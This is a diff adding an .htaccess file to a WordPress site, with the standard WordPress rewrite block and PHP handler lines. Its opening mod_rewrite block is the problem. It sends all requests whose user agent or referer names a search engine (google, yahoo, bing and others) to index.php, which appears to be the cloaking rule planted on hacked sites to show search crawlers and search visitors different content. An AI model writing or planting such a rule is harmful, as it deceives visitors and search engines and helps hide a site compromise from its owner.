@@ -1,0 +1,23 @@
+<IfModule mod_rewrite.c>
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^.*$ index.php [L]
+</IfModule>
+
+
+AddHandler php53-script .php
+suPHP_ConfigPath /home/revistainfluencia/
+# BEGIN WordPress
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+
+# END WordPress
+
+AddHandler php7-script .php
+suPHP_ConfigPath /home/revistainfluencia/
